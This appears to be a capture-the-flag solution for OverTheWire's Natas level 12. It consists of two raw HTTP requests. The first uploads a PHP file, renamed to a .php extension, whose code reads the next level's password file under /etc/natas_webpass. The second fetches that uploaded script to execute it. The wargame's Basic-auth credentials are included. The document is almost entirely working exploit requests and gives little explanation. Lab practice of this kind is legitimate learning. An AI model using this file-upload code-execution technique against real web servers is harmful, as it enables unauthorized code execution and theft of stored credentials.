### Request - payload - creates backdoor
```
POST /index.php HTTP/1.1
Host: natas12.natas.labs.overthewire.org
Content-Length: 454
Cache-Control: max-age=0
Authorization: Basic bmF0YXMxMjpFRFhwMHBTMjZ3TEtIWnkxckRCUFVaazBSS2ZMR0lSMw==
Upgrade-Insecure-Requests: 1
Origin: http://natas12.natas.labs.overthewire.org
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymBkA2bfQQNBrgqHj
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://natas12.natas.labs.overthewire.org/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Connection: close

------WebKitFormBoundarymBkA2bfQQNBrgqHj
Content-Disposition: form-data; name="MAX_FILE_SIZE"

1000
------WebKitFormBoundarymBkA2bfQQNBrgqHj
Content-Disposition: form-data; name="filename"

pkss7bauf9.php
------WebKitFormBoundarymBkA2bfQQNBrgqHj
Content-Disposition: form-data; name="uploadedfile"; filename="natas12.pass"
Content-Type: application/octet-stream

<?php
    echo readFile("/etc/natas_webpass/natas13");
?>

------WebKitFormBoundarymBkA2bfQQNBrgqHj--
```

### Request - get data from payload execution
```
GET /upload/pkss7bauf9.php HTTP/1.1
Host: natas12.natas.labs.overthewire.org
Authorization: Basic bmF0YXMxMjpFRFhwMHBTMjZ3TEtIWnkxckRCUFVaazBSS2ZMR0lSMw==
Referer: http://natas12.natas.labs.overthewire.org/
```
